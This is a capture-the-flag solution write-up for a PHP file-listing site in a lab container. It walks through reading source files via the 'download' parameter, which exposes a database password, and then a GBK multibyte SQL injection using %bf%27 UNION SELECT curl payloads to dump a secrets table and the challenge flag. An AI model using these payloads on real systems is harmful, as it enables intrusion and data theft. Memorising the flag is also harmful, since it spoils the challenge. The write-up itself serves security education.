# Solution

The site lists files for download. Files `white.png` and `gray.png` have a download link that should raise eyebrows:
```
http://172.17.0.2:8080/?download=uploads/white.png
```

Supplying sample LFI payloads to the `download` parameter does not give a lot:
```
$ curl http://172.17.0.2:8080/?download=../../../../../../../../etc/passwd
<html>
	<head><title>MyCDN</title></head>
	<body>
		<h1>My Listing</h1>
		<hr>
		<table border='2'>
			<tr><th>ID</th><th>NAME</th><th>PATH</th></tr>
			<tr><td>1</td><td>white.png</td><td>uploads/white.png</td><td><a href='?download=uploads/white.png'>Download</a></td></tr><tr><td>2</td><td>gray.png</td><td>uploads/gray.png</td><td><a href='?download=uploads/gray.png'>Download</a></td></tr>		</table>
	</body>
</html>
```

But downloading `index.php` does:
```
$ curl http://172.17.0.2:8080/?download=index.php
<?php
require_once(dirname(__FILE__) . '/config.php');
require_once(dirname(__FILE__) . '/db/db.class.php');

try {
	$db = new DB($server, $username, $password, $database);
	$db->connect();
} catch (Exception $e) {
	die('Connection failed: ' . $e->getMessage());
}

if (isset($_GET['download'])) {
	$f = $_GET['download'];
	$file = realpath($f);
	$dirs = glob(dirname(__FILE__) . '/*');
	array_push($dirs, dirname(__FILE__));
	$ok = false;
	foreach ($dirs as &$d) {
		if (dirname($file) == realpath($d)) {
			$ok = true;
			break;
		}
	}
	if ($ok && file_exists($file)) {
		header('Content-Description: File Transfer');
		header('Content-Type: application/octet-stream');
		header('Content-Disposition: attachment; filename=' . basename($file));
		header('Content-Transfer-Encoding: binary');
		header('Expires: 0');
		header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
		header('Pragma: public');
		header('Content-Length: ' . filesize($file));
		ob_clean();
		flush();
		readfile($file);
		exit;
	}
}
?>
<html>
	<head><title>MyCDN</title></head>
	<body>
		<h1>My Listing</h1>
		<hr>
		<table border='2'>
			<tr><th>ID</th><th>NAME</th><th>PATH</th></tr>
			<?php
			$uploads = isset($_GET['name']) ? $db->findByName($_GET['name']) : $db->findAll();
			foreach ($uploads as &$u) {
				echo "<tr><td>$u->id</td><td>$u->name</td><td>$u->path</td><td><a href='?download=$u->path'>Download</a></td></tr>";
			}
			?>
		</table>
	</body>
</html>
```

By looking at the source code, there are two other files that are required by `index.php`:
```
$ curl http://172.17.0.2:8080/?download=config.php
<?php
$server = 'localhost';
$username = 'user';
$password = 'Strong3stP4ssw0rd-H4ckTh3Pl4n3t';
$database = 'myCDN';
?>
$ curl http://172.17.0.2:8080/?download=./db/db.class.php
<?php
require_once(dirname(__FILE__) . '/upload.class.php');

class DB {

	private $server;
	private $username;
	private $password;
	private $database;
	private $conn;
	
	function __construct($server, $username, $password, $database) {
		$this->server = $server;
		$this->username = $username;
		$this->password = $password;
		$this->database = $database;
	}
	
	function getConnection() {
		return $this->conn;
	}
	
	function connect() {
		$this->conn = new PDO("mysql:host=$this->server;dbname=$this->database", $this->username, $this->password);
		$this->conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
		$this->conn->query('SET NAMES gbk');
	}
	
	function close() {
		$this->conn = null;
	}
	
	function findAll() {
		$this->checkConnection();
		$stmt = $this->conn->prepare('SELECT id, name, path FROM uploads');
		$stmt->setFetchMode(PDO::FETCH_CLASS, 'Upload');
		$stmt->execute();
		return $stmt->fetchAll();
	}
	
	function findByName($name) {
		$this->checkConnection();
		$stmt = $this->conn->prepare('SELECT id, name, path FROM uploads WHERE name = ?');
		$stmt->setFetchMode(PDO::FETCH_CLASS, 'Upload');
		$stmt->bindValue(1, $name);
		$stmt->execute();
		return $stmt->fetchAll();
	}
	
	function __destruct() {
		$this->close();
	}
	
	private function checkConnection() {
		if ($this->conn == null) {
			throw new PDOException('not connected');
		}
	}
}
?>
```

Inspecting `db.class.php` shows that there is a preliminary query executed when connecting:
```
SET NAMES gbk
```

This query is a problem, since `mysql_real_escape` can be circumvented when `gbk` is used. You can find a lot of resources regarding this on the web.

Therefore, our next step is to perform SQLi by carefully crafting payloads for `/?name=[param]` endpoint. This can also be easily automated to extract all data.

The most important data to extract is:
```
$ curl "http://172.17.0.2:8080/?name=%bf%27%20UNION%20SELECT%201,table_name,table_schema%20FROM%20INFORMATION_SCHEMA.TABLES%20LIMIT%201%20OFFSET%2079%23"
<html>
	<head><title>MyCDN</title></head>
	<body>
		<h1>My Listing</h1>
		<hr>
		<table border='2'>
			<tr><th>ID</th><th>NAME</th><th>PATH</th></tr>
			<tr><td>1</td><td>cdnsecrets</td><td>myCDN</td><td><a href='?download=myCDN'>Download</a></td></tr>		</table>
	</body>
</html>
```

There is an additional table called `cdnsecrets`.

```
$ curl "http://172.17.0.2:8080/?name=%bf%27%20UNION%20SELECT%201,TABLE_NAME,COLUMN_NAME%20FROM%20INFORMATION_SCHEMA.COLUMNS%20LIMIT%201%20OFFSET%20780%23"
<html>
	<head><title>MyCDN</title></head>
	<body>
		<h1>My Listing</h1>
		<hr>
		<table border='2'>
			<tr><th>ID</th><th>NAME</th><th>PATH</th></tr>
			<tr><td>1</td><td>cdnsecrets</td><td>content</td><td><a href='?download=content'>Download</a></td></tr>		</table>
	</body>
</html>
```

There is an interesting column called `content` in `cdnsecrets`. Fetching data from this column gives out the flag:
```
$ curl "http://172.17.0.2:8080/?name=%bf%27%20UNION%20SELECT%201,2,content%20FROM%20cdnsecrets%20LIMIT%201%23"
<html>
	<head><title>MyCDN</title></head>
	<body>
		<h1>My Listing</h1>
		<hr>
		<table border='2'>
			<tr><th>ID</th><th>NAME</th><th>PATH</th></tr>
			<tr><td>1</td><td>2</td><td>ibctf{l4y3rs_up0n-L4Y3R-0f-w1nd_4nd_r41n-c4nn0t_s3p4r4t3-UZz}</td><td><a href='?download=ibctf{l4y3rs_up0n-L4Y3R-0f-w1nd_4nd_r41n-c4nn0t_s3p4r4t3-UZz}'>Download</a></td></tr>		</table>
	</body>
</html>
```
